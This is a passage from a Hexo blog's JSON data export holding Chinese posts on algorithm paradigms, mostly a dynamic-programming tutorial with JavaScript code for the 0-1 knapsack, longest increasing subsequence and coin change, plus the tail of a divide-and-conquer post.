title=\"基本步骤\"></a>基本步骤</h3><ul>\n<li>分解问题(divide)：把原问题分解为若干个与原问题性质相类似的子问题</li>\n<li>求解子问题(conquer)：不断分解子问题直到可方便求出子问题的解为止</li>\n<li>合并子问题的解(combine)：合并子问题的解得到原问题的解</li>\n</ul>\n<h3 id=\"使用场景\"><a href=\"#使用场景\" class=\"headerlink\" title=\"使用场景\"></a>使用场景</h3><ul>\n<li>原问题可以分解为若干个与原问题性质相类似的子问题</li>\n<li>问题的规模缩小到一定程度后可方便求出解</li>\n<li>子问题的解可以合并得到原问题的解</li>\n<li>分解出的各个子问题应相互独立，即不包含重叠子问题</li>\n</ul>\n<h3 id=\"案例题\"><a href=\"#案例题\" class=\"headerlink\" title=\"案例题\"></a>案例题</h3><ul>\n<li>有序数组查找（二分法）</li>\n<li>求根号</li>\n<li>快速排序、归并排序</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 找到一个数字在指定精度内的平方根</span></span><br><span class=\"line\"><span class=\"comment\"> * </span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param </span>num 数字</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param </span>pricision 精度</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sqrt</span>(<span class=\"params\">num, pricision</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> up = num &gt; <span class=\"number\">1</span> ? num : <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> down = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> n;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">    n = (down + up) / <span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (n * n - num &lt;= pricision &amp;&amp; n * n - num &gt;= <span class=\"number\">0</span>) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (n * n - num &gt; pricision) up = n;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (n * n - num &lt; <span class=\"number\">0</span>) down = n;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">sqrt(<span class=\"number\">10</span>, <span class=\"number\">0.001</span>); <span class=\"comment\">// 3.162384033203125</span></span><br></pre></td></tr></table></figure>"},{"title":"算法范式 - 动态规划","date":"2021-06-01T08:32:28.000Z","_content":"\n\n# 算法范式 - 动态规划\n\n动态规划是通过拆分问题，定义问题状态和状态之间的关系，使得问题能够以递推（或者分治）的方式去解决。\n\n> 如何拆分问题，是动态规划的核心。而拆分问题，靠的就是状态的定义和状态转移方程的定义。\n\n动态规划的特点：\n* 把原来的问题分解成了几个**相似的子问题**；\n* 所有的子问题都**只需要解决一次**；\n* **储存**子问题的解；\n\n### 0 - 1 背包问题\n\n该问题可以描述为：给定一组物品，每种物品都有自己的重量和价格，在限定的总重量内，我们如何选择，才能使得物品的总价格最高。每个问题只能放入至多一次。\n\n假设有以下物品：\n\n| 物品重量 | 价值 |\n| --- | --- |\n| 1 | 3 |\n| 2 | 7 |\n| 3 | 12 |\n\n对于这个问题来说，子问题就两个，分别是放物品和不放物品，可以通过以下表格来理解子问题\n\n| 物品重量 / 剩余容量 | 0 | 1 | 2 | 3 | 4 | 5 |\n| --- | --- | --- | --- | --- | --- | --- |\n| 1 | 0 | 3 | 3 | 3 | 3 | 3 |\n| 2 | 0 | 3 | 7 | 10 | 10 | 10 |\n| 3 | 0 | 3 | 7 | 12 | 15 | 19 |\n\n直接来分析能放三种物品的情况，也就是最后一行\n\n* 当容量少于 3 时，只取上一行对应的数据，因为当前容量不能容纳物品 3\n* 当容量 为 3 时，考虑两种情况，分别为放入物品 3 和不放物品 3\n  * 不放物品 3 的情况下，总价值为 10\n  * 放入物品 3 的情况下，总价值为 12，所以应该放入物品 3\n* 当容量 为 4 时，考虑两种情况，分别为放入物品 3 和不放物品 3\n  * 不放物品 3 的情况下，总价值为 10\n  * 放入物品 3 的情况下，和放入物品 1 的价值相加，得出总价值为 15，所以应该放入物品 3\n* 当容量 为 5 时，考虑两种情况，分别为放入物品 3 和不放物品 3\n  * 不放物品 3 的情况下，总价值为 10\n  * 放入物品 3 的情况下，和放入物品 2 的价值相加，得出总价值为 19，所以应该放入物品 3\n\n```js\n/**\n * @param {*} w 物品重量\n * @param {*} v 物品价值\n * @param {*} C 总容量\n * @returns\n */\n\nfunction fn(w, v, c) {\n  let array = new Array(w.length);\n\n  // 完成底部子问题的解\n  array[0] = [];\n  for (let j = 0; j <= c; j++) {\n    array[0][j] = j >= w[0] ? v[0] : 0;\n  }\n\n  // 自底向上开始解决子问题，从物品 2 开始\n  for (let i = 1; i < w.length; i++) {\n    array[i] = [];\n\n    for (let j = 0; j <= c; j++) {\n      array[i][j] = array[i - 1][j];\n      if (j >= w[i]) {\n        array[i][j] = Math.max(array[i][j], v[i] + array[i - 1][j - w[i]]);\n      }\n    }\n  }\n  \n  console.log(array); // [[0, 3, 3, 3, 3, 3], ​​​​​​​​​​[0, 3, 7, 10, 10, 10], ​​​​​​​​​​[0, 3, 7, 12, 15, 19]]​​​​​\n  return array[w.length - 1][c];\n}\nfn([1, 2, 3], [3, 7, 12], 5);\n```\n\n\n\n### 最长递增子序列\n\n最长递增子序列意思是在一组数字中，找出最长一串递增的数字，比如 `0, 3, 4, 17, 2, 8, 6, 10`，对于以上这串数字来说，最长递增子序列就是 `0, 3, 4, 8, 10`\n\n设F{k}为以数列中第 k 项结尾的最长递增子序列的长度，则第 k 项结尾的LIS的长度是：保证第 i 项比第 k 项小的情况下，以第 i 项结尾的 LIS 长度加 1 的最大值，取遍i的所有值（i小于k）。\n\n| 数字 | 0 | 3 | 4 | 17 | 2 | 8 | 6 | 10 |\n| --- | --- | --- | --- | --- | --- | --- | --- | --- |\n| 长度 | 1 | 2 | 3 | 4 | 2 | 4 | 4 | 5 |\n\n通过以上表格可以很清晰的发现一个规律，遍历找出刚好比当前数字小的数，并且在小的数组成的长度基础上加 1。\n\n```js\nfunction list(arr) {\n  if (!Array.isArray(arr)) return 0;\n\n  const res = new Array(arr.length).fill(1);\n\n  for (let i = 1; i < arr.length; i++) {\n    for (let j = 0; j < i; j++) {\n      if (arr[i] > arr[j]) {\n        res[i] = Math.max(res[i], res[j] + 1);\n      }\n    }\n  }\n\n  return Math.max(...res);\n\n}\n\nlist([1, 7, 2, 8, 3, 4]); // 4\nlist([0, 3, 4, 17, 2, 8, 6, 10]); // 5\n```\n\n### 纸币找零\n\n```js\nfunction MinCoinChange(coins) {\n  var coins = coins; //{1}\n  var cache = {}; //{2}\n\n  MinCoinChange.prototype.makeChange = function (amount) {\n    if (!amount) return [];\n    if (cache[amount]) return cache[amount];\n    var min = [], newMin, newAmount;\n\n    for (var i = 0; i < coins.length; i++) { //{5}\n      var coin = coins[i];\n      newAmount = amount - coin; //{6}\n      if (newAmount >= 0) newMin = this.makeChange(newAmount); //{7}\n      if (\n        newAmount >= 0 && //{8}\n        (newMin.length < min.length - 1 || !min.length) //{9}\n        &&\n        (newMin.length || !newAmount) //{10}\n      ) {\n        min = [coin].concat(newMin); //{11}\n        console.log('new Min ' + min + ' for ' + amount);\n      }\n    }\n\n    return (cache[amount] = min); //{12}\n  };\n}\n\nvar minCoinChange = new MinCoinChange([1, 5, 10, 25]);\nconsole.log(minCoinChange.makeChange(36));\n\n```\n\n\n* 斐波那契数列\n* 背包问题\n* 最长递增子序列\n* 纸币找零\n* 台阶问题\n* 国王与金矿\n\n","source":"_posts/算法范式/算法范式 - 动态规划.md","raw":"---\ntitle: 算法范式 - 动态规划\ncategories: 算法范式\ntags: [算法范式]\ndate: 2021-06-01 16:32:28\n---\n\n\n# 算法范式 - 动态规划\n\n动态规划是通过拆分问题，定义问题状态和状态之间的关系，使得问题能够以递推（或者分治）的方式去解决。\n\n> 如何拆分问题，是动态规划的核心。而拆分问题，靠的就是状态的定义和状态转移方程的定义。\n\n动态规划的特点：\n* 把原来的问题分解成了几个**相似的子问题**；\n* 所有的子问题都**只需要解决一次**；\n* **储存**子问题的解；\n\n### 0 - 1 背包问题\n\n该问题可以描述为：给定一组物品，每种物品都有自己的重量和价格，在限定的总重量内，我们如何选择，才能使得物品的总价格最高。每个问题只能放入至多一次。\n\n假设有以下物品：\n\n| 物品重量 | 价值 |\n| --- | --- |\n| 1 | 3 |\n| 2 | 7 |\n| 3 | 12 |\n\n对于这个问题来说，子问题就两个，分别是放物品和不放物品，可以通过以下表格来理解子问题\n\n| 物品重量 / 剩余容量 | 0 | 1 | 2 | 3 | 4 | 5 |\n| --- | --- | --- | --- | --- | --- | --- |\n| 1 | 0 | 3 | 3 | 3 | 3 | 3 |\n| 2 | 0 | 3 | 7 | 10 | 10 | 10 |\n| 3 | 0 | 3 | 7 | 12 | 15 | 19 |\n\n直接来分析能放三种物品的情况，也就是最后一行\n\n* 当容量少于 3 时，只取上一行对应的数据，因为当前容量不能容纳物品 3\n* 当容量 为 3 时，考虑两种情况，分别为放入物品 3 和不放物品 3\n  * 不放物品 3 的情况下，总价值为 10\n  * 放入物品 3 的情况下，总价值为 12，所以应该放入物品 3\n* 当容量 为 4 时，考虑两种情况，分别为放入物品 3 和不放物品 3\n  * 不放物品 3 的情况下，总价值为 10\n  * 放入物品 3 的情况下，和放入物品 1 的价值相加，得出总价值为 15，所以应该放入物品 3\n* 当容量 为 5 时，考虑两种情况，分别为放入物品 3 和不放物品 3\n  * 不放物品 3 的情况下，总价值为 10\n  * 放入物品 3 的情况下，和放入物品 2 的价值相加，得出总价值为 19，所以应该放入物品 3\n\n```js\n/**\n * @param {*} w 物品重量\n * @param {*} v 物品价值\n * @param {*} C 总容量\n * @returns\n */\n\nfunction fn(w, v, c) {\n  let array = new Array(w.length);\n\n  // 完成底部子问题的解\n  array[0] = [];\n  for (let j = 0; j <= c; j++) {\n    array[0][j] = j >= w[0] ? v[0] : 0;\n  }\n\n  // 自底向上开始解决子问题，从物品 2 开始\n  for (let i = 1; i < w.length; i++) {\n    array[i] = [];\n\n    for (let j = 0; j <= c; j++) {\n      array[i][j] = array[i - 1][j];\n      if (j >= w[i]) {\n        array[i][j] = Math.max(array[i][j], v[i] + array[i - 1][j - w[i]]);\n      }\n    }\n  }\n  \n  console.log(array); // [[0, 3, 3, 3, 3, 3], ​​​​​​​​​​[0, 3, 7, 10, 10, 10], ​​​​​​​​​​[0, 3, 7, 12, 15, 19]]​​​​​\n  return array[w.length - 1][c];\n}\nfn([1, 2, 3], [3, 7, 12], 5);\n```\n\n\n\n### 最长递增子序列\n\n最长递增子序列意思是在一组数字中，找出最长一串递增的数字，比如 `0, 3, 4, 17, 2, 8, 6, 10`，对于以上这串数字来说，最长递增子序列就是 `0, 3, 4, 8, 10`\n\n设F{k}为以数列中第 k 项结尾的最长递增子序列的长度，则第 k 项结尾的LIS的长度是：保证第 i 项比第 k 项小的情况下，以第 i 项结尾的 LIS 长度加 1 的最大值，取遍i的所有值（i小于k）。\n\n| 数字 | 0 | 3 | 4 | 17 | 2 | 8 | 6 | 10 |\n| --- | --- | --- | --- | --- | --- | --- | --- | --- |\n| 长度 | 1 | 2 | 3 | 4 | 2 | 4 | 4 | 5 |\n\n通过以上表格可以很清晰的发现一个规律，遍历找出刚好比当前数字小的数，并且在小的数组成的长度基础上加 1。\n\n```js\nfunction list(arr) {\n  if (!Array.isArray(arr)) return 0;\n\n  const res = new Array(arr.length).fill(1);\n\n  for (let i = 1; i < arr.length; i++) {\n    for (let j = 0; j < i; j++) {\n      if (arr[i] > arr[j]) {\n        res[i] = Math.max(res[i], res[j] + 1);\n      }\n    }\n  }\n\n  return Math.max(...res);\n\n}\n\nlist([1, 7, 2, 8, 3, 4]); // 4\nlist([0, 3, 4, 17, 2, 8, 6, 10]); // 5\n```\n\n### 纸币找零\n\n```js\nfunction MinCoinChange(coins) {\n  var coins = coins; //{1}\n  var cache = {}; //{2}\n\n  MinCoinChange.prototype.makeChange = function (amount) {\n    if (!amount) return [];\n    if (cache[amount]) return cache[amount];\n    var min = [], newMin, newAmount;\n\n    for (var i = 0; i < coins.length; i++) { //{5}\n      var coin = coins[i];\n      newAmount = amount - coin; //{6}\n      if (newAmount >= 0) newMin = this.makeChange(newAmount); //{7}\n      if (\n        newAmount >= 0 && //{8}\n        (newMin.length < min.length - 1 || !min.length) //{9}\n        &&\n        (newMin.length || !newAmount) //{10}\n      ) {\n        min = [coin].concat(newMin); //{11}\n        console.log('new Min ' + min + ' for ' + amount);\n      }\n    }\n\n    return (cache[amount] = min); //{12}\n  };\n}\n\nvar minCoinChange = new MinCoinChange([1, 5, 10, 25]);\nconsole.log(minCoinChange.makeChange(36));\n\n```\n\n\n* 斐波那契数列\n* 背包问题\n* 最长递增子序列\n* 纸币找零\n* 台阶问题\n* 国王与金矿\n\n","slug":"算法范式/算法范式 - 动态规划","published":1,"updated":"2021-06-07T11:30:25.511Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmjarfj0004xv6r6w3dhxcx","content":"<h1 id=\"算法范式-动态规划\"><a href=\"#算法范式-动态规划\" class=\"headerlink\" title=\"算法范式 - 动态规划\"></a>算法范式 - 动态规划</h1><p>动态规划是通过拆分问题，定义问题状态和状态之间的关系，使得问题能够以递推（或者分治）的方式去解决。</p>\n<blockquote>\n<p>如何拆分问题，是动态规划的核心。而拆分问题，靠的就是状态的定义和状态转移方程的定义。</p>\n</blockquote>\n<p>动态规划的特点：</p>\n<ul>\n<li>把原来的问题分解成了几个<strong>相似的子问题</strong>；</li>\n<li>所有的子问题都<strong>只需要解决一次</strong>；</li>\n<li><strong>储存</strong>子问题的解；</li>\n</ul>\n<h3 id=\"0-1-背包问题\"><a href=\"#0-1-背包问题\" class=\"headerlink\" title=\"0 - 1 背包问题\"></a>0 - 1 背包问题</h3><p>该问题可以描述为：给定一组物品，每种物品都有自己的重量和价格，在限定的总重量内，我们如何选择，才能使得物品的总价格最高。每个问题只能放入至多一次。</p>\n<p>假设有以下物品：</p>\n<table>\n<thead>\n<tr>\n<th>物品重量</th>\n<th>价值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td>3</td>\n</tr>\n<tr>\n<td>2</td>\n<td>7</td>\n</tr>\n<tr>\n<td>3</td>\n<td>12</td>\n</tr>\n</tbody></table>\n<p>对于这个问题来说，子问题就两个，分别是放物品和不放物品，可以通过以下表格来理解子问题</p>\n<table>\n<thead>\n<tr>\n<th>物品重量 / 剩余容量</th>\n<th>0</th>\n<th>1</th>\n<th>2</th>\n<th>3</th>\n<th>4</th>\n<th>5</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td>0</td>\n<td>3</td>\n<td>3</td>\n<td>3</td>\n<td>3</td>\n<td>3</td>\n</tr>\n<tr>\n<td>2</td>\n<td>0</td>\n<td>3</td>\n<td>7</td>\n<td>10</td>\n<td>10</td>\n<td>10</td>\n</tr>\n<tr>\n<td>3</td>\n<td>0</td>\n<td>3</td>\n<td>7</td>\n<td>12</td>\n<td>15</td>\n<td>19</td>\n</tr>\n</tbody></table>\n<p>直接来分析能放三种物品的情况，也就是最后一行</p>\n<ul>\n<li>当容量少于 3 时，只取上一行对应的数据，因为当前容量不能容纳物品 3</li>\n<li>当容量 为 3 时，考虑两种情况，分别为放入物品 3 和不放物品 3<ul>\n<li>不放物品 3 的情况下，总价值为 10</li>\n<li>放入物品 3 的情况下，总价值为 12，所以应该放入物品 3</li>\n</ul>\n</li>\n<li>当容量 为 4 时，考虑两种情况，分别为放入物品 3 和不放物品 3<ul>\n<li>不放物品 3 的情况下，总价值为 10</li>\n<li>放入物品 3 的情况下，和放入物品 1 的价值相加，得出总价值为 15，所以应该放入物品 3</li>\n</ul>\n</li>\n<li>当容量 为 5 时，考虑两种情况，分别为放入物品 3 和不放物品 3<ul>\n<li>不放物品 3 的情况下，总价值为 10</li>\n<li>放入物品 3 的情况下，和放入物品 2 的价值相加，得出总价值为 19，所以应该放入物品 3</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;*&#125;</span> </span>w 物品重量</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;*&#125;</span> </span>v 物品价值</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;*&#125;</span> </span>C 总容量</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@returns</span></span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fn</span>(<span class=\"params\">w, v, c</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> array = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>(w.length);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 完成底部子问题的解</span></span><br><span class=\"line\">  array[<span class=\"number\">0</span>] = [];</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> j = <span class=\"number\">0</span>; j &lt;= c; j++) &#123;</span><br><span class=\"line\">    array[<span class=\"number\">0</span>][j] = j &gt;= w[<span class=\"number\">0</span>] ? v[<span class=\"number\">0</span>] : <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 自底向上开始解决子问题，从物品 2 开始</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">1</span>; i &lt; w.length; i++) &#123;</span><br><span class=\"line\">    array[i] = [];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> j = <span class=\"number\">0</span>; j &lt;= c; j++) &#123;</span><br><span class=\"line\">      array[i][j] = array[i - <span class=\"number\">1</span>][j];</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (j &gt;= w[i]) &#123;</span><br><span class=\"line\">        array[i][j] = <span class=\"built_in\">Math</span>.max(array[i][j], v[i] + array[i - <span class=\"number\">1</span>][j - w[i]]);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(array); <span class=\"comment\">// [[0, 3, 3, 3, 3, 3], ​​​​​​​​​​[0, 3, 7, 10, 10, 10], ​​​​​​​​​​[0, 3, 7, 12, 15, 19]]​​​​​</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> array[w.length - <span class=\"number\">1</span>][c];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">fn([<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>], [<span class=\"number\">3</span>, <span class=\"number\">7</span>, <span class=\"number\">12</span>], <span class=\"number\">5</span>);</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"最长递增子序列\"><a href=\"#最长递增子序列\" class=\"headerlink\" title=\"最长递增子序列\"></a>最长递增子序列</h3><p>最长递增子序列意思是在一组数字中，找出最长一串递增的数字，比如 <code>0, 3, 4, 17, 2, 8, 6, 10</code>，对于以上这串数字来说，最长递增子序列就是 <code>0, 3, 4, 8, 10</code></p>\n<p>设F{k}为以数列中第 k 项结尾的最长递增子序列的长度，则第 k 项结尾的LIS的长度是：保证第 i 项比第 k 项小的情况下，以第 i 项结尾的 LIS 长度加 1 的最大值，取遍i的所有值（i小于k）。</p>\n<table>\n<thead>\n<tr>\n<th>数字</th>\n<th>0</th>\n<th>3</th>\n<th>4</th>\n<th>17</th>\n<th>2</th>\n<th>8</th>\n<th>6</th>\n<th>10</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>长度</td>\n<td>1</td>\n<td>2</td>\n<td>3</td>\n<td>4</td>\n<td>2</td>\n<td>4</td>\n<td>4</td>\n<td>5</td>\n</tr>\n</tbody></table>\n<p>通过以上表格可以很清晰的发现一个规律，遍历找出刚好比当前数字小的数，并且在小的数组成的长度基础上加 1。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">list</span>(<span class=\"params\">arr</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!<span class=\"built_in\">Array</span>.isArray(arr)) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>(arr.length).fill(<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> j = <span class=\"number\">0</span>; j &lt; i; j++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (arr[i] &gt; arr[j]) &#123;</span><br><span class=\"line\">        res[i] = <span class=\"built_in\">Math</span>.max(res[i], res[j] + <span class=\"number\">1</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.max(...res);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">list([<span class=\"number\">1</span>, <span class=\"number\">7</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>]); <span class=\"comment\">// 4</span></span><br><span class=\"line\">list([<span class=\"number\">0</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">17</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">6</span>, <span class=\"number\">10</span>]); <span class=\"comment\">// 5</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"纸币找零\"><a href=\"#纸币找零\" class=\"headerlink\" title=\"纸币找零\"></a>纸币找零</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">MinCoinChange</span>(<span class=\"params\">coins</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> coins = coins; <span class=\"comment\">//&#123;1&#125;</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> cache = &#123;&#125;; <span class=\"comment\">//&#123;2&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  MinCoinChange.prototype.makeChange = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">amount</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!amount) <span class=\"keyword\">return</span> [];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (cache[amount]) <span class=\"keyword\">return</span> cache[amount];</span><br><span class=\"line\">    <span class=\"keyword\">var</span> min = [], newMin, newAmount;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; coins.length; i++) &#123; <span class=\"comment\">//&#123;5&#125;</span></span><br><span class=\"line\">      <span class=\"keyword\">var</span> coin = coins[i];</span><br><span class=\"line\">      newAmount = amount - coin; <span class=\"comment\">//&#123;6&#125;</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (newAmount &gt;= <span class=\"number\">0</span>) newMin = <span class=\"built_in\">this</span>.makeChange(newAmount); <span class=\"comment\">//&#123;7&#125;</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (</span><br><span class=\"line\">        newAmount &gt;= <span class=\"number\">0</span> &amp;&amp; <span class=\"comment\">//&#123;8&#125;</span></span><br><span class=\"line\">        (newMin.length &lt; min.length - <span class=\"number\">1</span> || !min.length) <span class=\"comment\">//&#123;9&#125;</span></span><br><span class=\"line\">        &amp;&amp;</span><br><span class=\"line\">        (newMin.length || !newAmount) <span class=\"comment\">//&#123;10&#125;</span></span><br><span class=\"line\">      ) &#123;</span><br><span class=\"line\">        min = [coin].concat(newMin); <span class=\"comment\">//&#123;11&#125;</span></span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;new Min &#x27;</span> + min + <span class=\"string\">&#x27; for &#x27;</span> + amount);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (cache[amount] = min); <span class=\"comment\">//&#123;12&#125;</span></span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> minCoinChange = <span class=\"keyword\">new</span> MinCoinChange([<span class=\"number\">1</span>, <span class=\"number\">5</span>, <span class=\"number\">10</span>, <span class=\"number\">25</span>]);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(minCoinChange.makeChange(<span class=\"number\">36</span>));</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<ul>\n<li>斐波那契数列</li>\n<li>背包问题</li>\n<li>最长递增子序列</li>\n<li>纸币找零</li>\n<li>台阶问题</li>\n<li>国王与金矿</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"算法范式-动态规划\"><a href=\"#算法范式-动态规划\" class=\"headerlink\" title=\"算法范式 - 动态规划\"></a>算法范式 - 